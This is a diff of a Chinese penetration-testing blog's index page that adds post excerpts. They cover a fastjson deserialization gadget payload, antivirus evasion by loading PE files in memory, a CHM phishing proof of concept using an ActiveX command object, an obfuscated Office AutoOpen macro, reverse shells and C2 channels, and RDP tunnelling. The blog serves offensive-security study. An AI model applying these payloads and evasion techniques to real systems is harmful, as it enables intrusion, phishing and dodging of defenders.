@@ -26,14 +26,21 @@
         <div id="block_container">
             <div class="container">
                 <ul class="posts"><li><div class="post-meta">
+			<a class="post-link" href="/posts/wdigest-reverse/">
+				<h2 class="post-title">wdigest逆向</h2>
+			</a>
+			<div class="post-date"><i class="icon-calendar"></i>Dec 11, 2020</div>
+		</div>
+		<div class="post">逆向从wdigest的SpAcceptCredentials开始，当使用windows账户凭据做认证时lsass将会调用这个函数。
+
+</div>
+	</li><li><div class="post-meta">
 			<a class="post-link" href="/posts/fastjson-serialization-analisys/">
 				<h2 class="post-title">fastjson 1.2.24反序列化过程学习</h2>
 			</a>
 			<div class="post-date"><i class="icon-calendar"></i>Sep 6, 2020</div>
 		</div>
-		<div class="post">本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧
-
-</div>
+		<div class="post">本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧 分析组件的过程跟逆向过程挺像，不过好的地方是有源码作为参考，所以过程也更加轻松 调试用的代码 String jsonString = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/adas\",\"autoCommit\":true}}"; Group group = JSON.parseObject(jsonString, Group.class); 从com.alibaba.fastjson.JSON#parseObject看起，首先实例化了一个DefaultJSONParser，而在实例化DefaultJSONParser的过程中又先实例化了一个JSONScanner，所以先看JSONScanner JSONScanner JSONScanner继承抽象类JSONLexerBase，作为lexer放在DefaultJSONParser内部 JSONLexerBase有几个成员变量 protected int token; protected int pos; protected int features; protected char ch; protected int bp;//当前指向的位置 protected int eofPos; /** * A character buffer for literals. */ protected char[] sbuf; protected int sp; /** *...</div>
 	</li><li><div class="post-meta">
 			<a class="post-link" href="/posts/re-summarize/">
 				<h2 class="post-title">逆向的一些总结</h2>
@@ -42,6 +49,98 @@
 		</div>
 		<div class="post">最近做了一些windows逆向的工作，尽管大部分都是苦力活，但还是有一些收获，所以总结一下
 
+
+  
+    观察程序行为
+
+    
+      文件操作
+      注册表读写
+      dll调用
+      ……
+    
+
+    procmon
+  
+  
+    定位关键代码
+
+    
+      搜索字符串特征
+      相关windows api
+        
+          CreateFile
+          ReadFile
+          WriteFile
+          ……
+        
+      
+      内存断点
+      函数特征，ida signature，findcrypt
+    
+  
+  
+    代码分析
+
+    
+      动态分析 =&gt; 分析具体行为
+      静态分析 =&gt; 分析调用关系，程序逻辑
+      关注数据流向
+      类的识别
+    
+  
+  
+    逆不动？
+
+    
+      注入进程寻找解密后的数据
+      找到解密函数直接调用
+    
+  
+  
+    未解决的问题以及可能的解决方案
+
+    
+      
+        结构体及类的逆向
+
+        下次可以尝试使用reclass
+      
+      
+        在发现一个已经初始化完毕的对象、结构体后，难以定位之前对其进行初始化、写入数据等操作的代码
+
+        
+          
+            ce搜索指针链，一层一层定位初始化代码
+          
+          
+            下断new，malloc、VirtualAlloc等函数，定位构造函数
+          
+          
+            根据构造函数特征定位构造函数
+
+            
+              
+                使用ecx传参（类函数特征）
+              
+              
+                函数开始push ebx, esi, edi, ecx寄存器，对exc操作之后再pop ecx
+
+                https://bbs.pediy.com/thread-195449.htm
+
+                https://www.cnblogs.com/predator-wang/p/8031071.html
+              
+            
+          
+        
+      
+    
+  
+
+
+ps：
+
+web手做逆向，有点惨
 </div>
 	</li><li><div class="post-meta">
 			<a class="post-link" href="/posts/framework-design/">
@@ -49,9 +148,7 @@
 			</a>
 			<div class="post-date"><i class="icon-calendar"></i>Mar 20, 2020</div>
 		</div>
-		<div class="post">如果想要将各个信息收集工具整合到一起，就需要为他们封装出统一的接口，我把这些具有统一接口的对象定义为Module类。Module类具有三个抽象方法需要在封装模块的时候实现：
-
-</div>
+		<div class="post">如果想要将各个信息收集工具整合到一起，就需要为他们封装出统一的接口，我把这些具有统一接口的对象定义为Module类。Module类具有三个抽象方法需要在封装模块的时候实现： exec 启动模块 get_output 获取模块执行结果 update_databse 将结果输出到数据库 class Module(metaclass=ABCMeta): def __init__(self, pipe=None): self.pipe_list = [] self.task_list = [] if isinstance(pipe, list): self.pipe_list = pipe[:] elif isinstance(pipe, Module): self.pipe_list.append(pipe) elif pipe is None: pass else: raise TypeError("Expected a List or Pipe type") def add_task(self, task): self.task_list.append(task) def register_pipe(self, pipe): if not...</div>
 	</li><li><div class="post-meta">
 			<a class="post-link" href="/posts/post-exploition-rethink/">
 				<h2 class="post-title">一次后渗透的反思</h2>
@@ -60,6 +157,35 @@
 		</div>
 		<div class="post">项目的一个目标，在可以执行命令后开始进行后渗透的工作。目标低权限，同时服务器装了杀软，还打了很多补丁，加上网络实在是不行所以工作展开的异常艰难，最终也只是获得一个反弹shell，所以写篇文章反思一下当前使用的工具还有哪些不足。
 
+过程
+
+
+  首先是自写的内存加载器，传上去没有问题，但是在加载msf的reverse_tcp payload之后（刚开启session但未接收到stager）程序自动退了，再运行程序的时候发现程序已经打不开了，失败。
+  怀疑是限制了流量，遂改成使用powershell加载cs的reverse_http，服务放在了80端口，同样失败。
+  尝试ssh隧道，连不上服务器
+  尝试马+dns隧道，dns隧道可以连通，但是上马失败
+  进行上述操作的过程会中间歇性地ban我ip，最后只好借了朋友的服务器，用powercat反弹了个shell，耻辱结束。
+
+
+分析
+
+虽然只进行了几次尝试，但几乎花费了我一天的时间，大部分时间都花在了配置以及忍受极慢网速的过程中。仔细分析各种方法失败的原因，我觉得问题出在流量上面。内存加载器获取payload的时候payload没有经过加密，之后的通信过程也没有加密，因此被识别出流量特征，之后的cs的reverse_http也同样如此。dns隧道尽管与服务器建立了加密隧道，但是在马与隧道之间流量扔需要经过本地回环，因此再次失败了。ssh隧道没法连接成功可能因为做了acl之类的东西。
+
+因此可以改进的地方有两点
+
+
+  流量特征
+  可信的ip/域名
+
+
+解决
+
+流量特征的问题很好解决，msf可以使用rc4加密的payload，cs也有malleable C2可以修改证书加密流量。那如何让自己的ip/域名可信呢？奇安信A-team在2019BCS中介绍过很多使用第三方服务用作C2的文章，这对我来说是相对可行的方案。
+
+Dropbox as a C2 channel using the Dropbox APIs
+
+感觉又要写好多代码。。
+
 </div>
 	</li><li><div class="post-meta">
 			<a class="post-link" href="/posts/database-design/">
@@ -67,27 +193,21 @@
 			</a>
 			<div class="post-date"><i class="icon-calendar"></i>Mar 6, 2020</div>
 		</div>
-		<div class="post">对于渗透来说，信息收集的完整度决定了最后渗透的成功与否。当对一个大型目标进行渗透的过程中，信息收集的工作便变得繁重。尽管现在有诸多自动化工具为我们完成信息收集方方面面的工作，但是如何将这些工具串联起来？输入一个域名后就能自动进行各方面的收集（包括子域名，端口探测，web指纹，web路径等等），这是我所期望的效果。因此我想要实现一个框架，将各种工具组合到一起进行全自动的信息收集。
-
-</div>
+		<div class="post">对于渗透来说，信息收集的完整度决定了最后渗透的成功与否。当对一个大型目标进行渗透的过程中，信息收集的工作便变得繁重。尽管现在有诸多自动化工具为我们完成信息收集方方面面的工作，但是如何将这些工具串联起来？输入一个域名后就能自动进行各方面的收集（包括子域名，端口探测，web指纹，web路径等等），这是我所期望的效果。因此我想要实现一个框架，将各种工具组合到一起进行全自动的信息收集。 数据存储与数据库范式 在信息收集之后，我们应该如何存储这些收集来的数据？长久以来我都是对每一个项目单开一个文件夹，将扫描结果以文本的形式零散的存放进去。这样做既不便于整理也不便于查找。因此我产生了使用数据库的念头（事实上数据库不就是干这个用的嘛）。随之而来的问题是如何设计？我们知道数据库由库、表组成，表中是按照列名存储的一行一行数据，怎样的设计才能让我们的数据是简洁、结构清晰同时还方便查找，这时候就需要用到数据库范式。 数据库的设计范式是数据库设计所需要满足的规范，满足这些规范的数据库是简洁的、结构明晰的，同时，不会发生插入（insert）、删除（delete）和更新（update）操作异常。反之则是乱七八糟，不仅给数据库的编程人员制造麻烦，而且面目可憎，可能存储了大量不需要的冗余信息。 下面只对4个范式进行简单回顾。 1NF 1NF是对属性的原子性，要求属性具有原子性，不可再分解； 举个例子，假设一个表中有一列叫出生年月日，每人的这列数据都分为3个格子（年、月、日），那这种数据库就不符合1NF。而事实上1NF是关系型数据库的基本要求，这也代表着如果你这么设计数据表的话那这种操作一定是不会成功的。 2NF 2NF是对记录的惟一性，要求记录有惟一标识，即实体的惟一性，即不存在部分依赖； 2NF在1NF的基础上消除了非主属性对于码的部分函数依赖，简单来讲就是非主键字段必须完全依赖主键。假设一张表主键为（学号，课号），那么对于属性姓名来讲，只有学号才决定姓名而与课号无关，因此属性姓名对于主键为部分依赖，因此不符合2NF 3NF 3NF是对字段的冗余性，要求任何字段不能由其他字段派生出来，它要求字段没有冗余，即不存在传递依赖； 3NF在2NF的基础之上，消除了非主属性对于码的传递函数依赖。如果一张表学号为主键，有属性学院名和学院主任，学号决定所属学院，所属学院决定学院主任。因此学院主任这个属性对主属性学号为传递依赖，不符合3NF BCNF 若关系模式R属于3NF，且关系模式中每一个决定因素都包含候选键，则为BCNF。 BCNF不允许存在主属性对于码的部分函数依赖与传递函数依赖。（实在想不出该怎么解释） 当我们设计的数据库达到了BCNF范式的要求，那么这个设计可以说是相当不错的，虽然之后还有4NF、5NF，但是我们不作考虑。（不会） 设计 首先要确定要存什么样的内容 项目属性 project_name：项目名称 domain：目标所有的域名 对于域名 ip_address:指向的ip use_CDN:是否使用cdn 对于每台服务器 ip_address：目标所有的ip地址 open_port_id：目标ip开放的端口 port_service：目标ip端口上运行的服务 对于web服务 url：不用多说 web_fingerprint：目标web服务的指纹 title：web服务网页的标题 screenshot_path：web服务的截屏的存储路径 available_path：扫描出的web服务的路径 对于web服务的每个路径 state_code：各个路径的状态码 content-length：返回的内容长度 redirect：如果有重定向，重定向的位置 确定这些数据的关系（X -&gt; Y 代表存在函数依赖且X函数决定Y） domain -&gt; project_name domain -&gt; ip_address...</div>
 	</li><li><div class="post-meta">
 			<a class="post-link" href="/posts/memory-execute/">
 				<h2 class="post-title">使用内存加载躲避静态查杀</h2>
 			</a>
 			<div class="post-date"><i class="icon-calendar"></i>Feb 28, 2020</div>
 		</div>
-		<div class="post">在进行后渗透阶段的过程中，首先要面临的问题就是免杀。如果服务器安装了反病毒软件，那不管是用马进行权限维持还是上传提权exp进行提权，甚至使用一些隧道工具（如ew）都将都到影响。如果是使用msf/cs等工具可以使用加载shellcode的方式进行免杀，但是涉及到一些常用工具的免杀就需要用修改源码、修改特征码的方式进行处理。这种处理不但烦琐而且不具有通用性，因此开发一种通用的工具来进行免杀是必要的。
-
-</div>
+		<div class="post">在进行后渗透阶段的过程中，首先要面临的问题就是免杀。如果服务器安装了反病毒软件，那不管是用马进行权限维持还是上传提权exp进行提权，甚至使用一些隧道工具（如ew）都将都到影响。如果是使用msf/cs等工具可以使用加载shellcode的方式进行免杀，但是涉及到一些常用工具的免杀就需要用修改源码、修改特征码的方式进行处理。这种处理不但烦琐而且不具有通用性，因此开发一种通用的工具来进行免杀是必要的。 本文将只探讨思路，不涉及具体实现。 特征码技术与免杀 特征码技术：运用程序中某一段或几段64字节以下的代码作为判别程序病毒的主要依据 谈到杀毒软件就不得不说特征码技术，尽管历史悠久，但到目前为止仍是各大杀毒软件判断可执行程序的主要手段。shellcode分离免杀之所以能获得很好的效果就是因为shellcode加载器本身并不包含恶意代码，自然也不会包含恶意软件的特征码，而只有当加载器运行时，它才会从程序之外加载shellcode执行。 借鉴shellcode分离免杀的思路，如果将pe文件以加密的形式存储，使用加载器读取pe文件并解密，最后放到内存中执行，那么程序的免杀性将大大地提高。实际上类似的技术早在至少08年就被提出过，叫做反射型dll注入（reflective dll injection），通过内存而不是从磁盘上加载dll。要实现从内存加载可执行程序并不困难，只要了解操作系统如何将exe加载到内存并编程重新实现就可以了。 实现原理 exe程序被执行的过程： windows pe loader读取pe文件，检查pe文件的有效性。 根据pe文件头中的IMAGE_OPTIONAL_HEADER.SizeOfImage申请一块空间 pe loader将pe文件按IMAGE_OPTIONAL_HEADER.SectionAlignment展开，将pe文件装载到内存空间。 根据pe文件的导入表，pe loader将pe所需要的dll加载进地址空间并更新IAT 如果没有加载在pe文件中设定的ImageBase，需要使用重定位表进行重定位 跳到pe入口点 基本上只要实现了上述几个步骤就可以实现内存加载，但是具体实现的时候我还遇到了几个问题： 如果PE文件不存在重定位表，应该如何加载 如何修改传给被加载程序的参数 如何加载.Net PE 如何加载x64程序 加载无重定位表的PE 关于重定位表： 当加载器加载程序时，如果加载器为某PE（.exe、.dll）分配的基址与其自身默认记录的ImageBase不相同，那么该程序文件加载完毕后就需要修正重定位表中的所有需要修正的地址。如果加载器分配的基址和该程序文件中记录默认的ImageBase相同，则不需要修正，重定位表对于该dll也是没有效用的。 因此如果将PE加载在默认的位置则可以无需重定位表。我们将加载器的ImageBase设为其他地址，为没有重定位表的pe程序让出空间，随后用virtualloc在目标pe程序的默认基址处开辟一块内存用来放置目标pe程序，这样就可以避免考虑重定位的问题。 修改传递给被加载程序的命令行参数 我对加载器的设想是传递一个目标pe文件路径参数给加载器，然后加载器通过路径进行加载。如果只是加载一些木马就不需要考虑命令行参数的问题，但是如果要加载一些工具那传递给加载器的参数就会污染传递给被加载pe文件的参数，因此需要考虑参数传递的问题。 一个进程如何获得命令行参数 一般进程获取到命令行参数的方法是通过windows api的GetCommandLine获取 LPSTR GetCommandLineA(); LPWSTR GetCommandLineW(); 有一个误区是很多人认为这个函数是从进程peb中获取到的参数，但实际上系统在加载进程时保存了一份命令行参数的拷贝在某个私有变量中，GetCommandLine都是从那个拷贝中获取，因此只有修改了拷贝的地址中的内容才有效。 示例代码 LPWSTR pCommandLine = GetCommandLineW(); LPSTR pCommandLineA = GetCommandLineA(); strcpy(pCommandLineA,...</div>
 	</li><li><div class="post-meta">
 			<a class="post-link" href="/posts/chm-phishing/">
 				<h2 class="post-title">使用CHM文件进行钓鱼</h2>
 			</a>
 			<div class="post-date"><i class="icon-calendar"></i>Jan 30, 2020</div>
 		</div>
-		<div class="post">进行钓鱼选择合适的payload非常重要，使用一些容易让人放松警惕的文件格式可以大大提高钓鱼的成功率。CHM是微软推出的基于HTML的帮助文件系统，被 IE 浏览器支持的JavaScript, VBScript, ActiveX,等，CHM同样支持。因此使用CHM作为钓鱼的payload非常合适。本文总结了两种基于CHM执行命令的方式。
-
-</div>
+		<div class="post">进行钓鱼选择合适的payload非常重要，使用一些容易让人放松警惕的文件格式可以大大提高钓鱼的成功率。CHM是微软推出的基于HTML的帮助文件系统，被 IE 浏览器支持的JavaScript, VBScript, ActiveX,等，CHM同样支持。因此使用CHM作为钓鱼的payload非常合适。本文总结了两种基于CHM执行命令的方式。 使用com控件命令执行 根据@ithurricanept的twitter https://twitter.com/ithurricanept/status/534993743196090368 使用了js调用com控件执行命令 源码如下： &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; command exec &lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt; &lt;PARAM name="Command" value="ShortCut"&gt; &lt;PARAM name="Button" value="Bitmap::shortcut"&gt; &lt;PARAM name="Item1" value=',calc.exe'&gt; &lt;PARAM name="Item2" value="273,1,1"&gt; &lt;/OBJECT&gt; &lt;SCRIPT&gt; x.Click(); &lt;/SCRIPT&gt; &lt;/body&gt;&lt;/html&gt; POC 使用HTML Help Workshop http://microsoft.com/en-us/download/details.aspx?id=21138 创建一个新的project，添加文件后进行编译 测试： 利用 实际测试的时候注意到了以下几点： 执行命令的时候注意传入的参数与程序名需要用逗号隔开，参数与参数之间不需要。 考虑到进行敏感操作会导致杀软提示，因此尽量避免使用powershell、bitsadmin、certutil、cscript等。 通过cmd执行命令也属于敏感操作，因此使用多个控件依次执行命令。 在搜索的过程中发现.chm文件的默认程序hh.exe具有decompile的功能，可以将打包进chm的文件释放出来...</div>
 	</li><li><div class="post-meta">
 			<a class="post-link" href="/posts/rdp-tuunel/">
 				<h2 class="post-title">渗透测试中的rdp隧道</h2>
@@ -96,6 +216,50 @@
 		</div>
 		<div class="post">渗透过程中总有一些特殊场景需要使用各种隧道来绕过防火墙的各种规则，而rdp作为windows的远程管理协议往往不在防火墙的考虑范围内。由于防火墙的规则，当只能通过一台windows服务器进入内网情况下，rdp隧道是唯一的选择。
 
+编译rdp2tcp
+
+安装mingw32，kali自带
+
+修改server的makefile.mingw32文件，修改cc为i686-w64-mingw32-gcc(根据实际情况修改)
+
+make client
+make server-mingw32
+
+
+得到client/rdp2tcp和server/rdp2tcp.exe
+
+编译xfreerdp
+
+kali自带的不支持rdp2tcp，因此自己编译一个
+
+git clone https://github.com/FreeRDP/FreeRDP.git
+cmake .
+make
+make install
+
+
+
+
+可以看到已经有了rdp2tcp选项
+
+rdp to tcp
+
+/usr/local/bin/xfreerdp /v:192.168.157.139:3389 /u:yuzuu_ /rdp2tcp:/root/rdp2tcp/client/rdp2tcp
+
+
+登录服务器，上传rdp2tcp.exe并运行
+
+使用rdp2tcp/tools/rdp2tcp.py来管理tunnel
+
+python rdp2tcp.py
+
+
+测试：
+
+将本地445端口的流量通过rdp tunnel转发到目标机上
+
+
+
 </div>
 	</li><li><div class="post-meta">
 			<a class="post-link" href="/posts/malicious-macro/">
@@ -103,9 +267,7 @@
 			</a>
 			<div class="post-date"><i class="icon-calendar"></i>Dec 3, 2019</div>
 		</div>
-		<div class="post">office宏，译自英文单词Macro。宏是微软公司为其OFFICE软件包设计的一个特殊功能，软件设计者为了让人们在使用软件进行工作时，避免一再地重复相同的动作而设计出来的一种工具，它利用简单的语法，把常用的动作写成宏，当在工作时，就可以直接利用事先编好的宏自动运行，去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。
-
-</div>
+		<div class="post">office宏，译自英文单词Macro。宏是微软公司为其OFFICE软件包设计的一个特殊功能，软件设计者为了让人们在使用软件进行工作时，避免一再地重复相同的动作而设计出来的一种工具，它利用简单的语法，把常用的动作写成宏，当在工作时，就可以直接利用事先编好的宏自动运行，去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。 生成执行cmd的宏 项目地址 https://github.com/metac0rtex/Office-Macro-Generator 生成示例: Public Sub AutoOpen() Dim cmd As String BxJnb = ChrW(99) &amp; ChrW(115) &amp; ChrW(99) &amp; ChrW(114) &amp; ChrW(105) &amp; ChrW(112) &amp; ChrW(116) &amp; ChrW(32) &amp; ChrW(68) &amp; ChrW(58) SAnJV = ChrW(92) &amp; ChrW(116) &amp; ChrW(101) &amp; ChrW(115) &amp; ChrW(116) &amp; ChrW(49) &amp; ChrW(49) &amp; ChrW(49)...</div>
 	</li></ul>
             </div>
             <!-- <div id="block_right">
@@ -137,6 +299,10 @@
                     
                     <li>
                         <a href="/java ">java</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/reverse-engineering ">reverse-engineering</a>
                     </li>
                     
                 </ul>
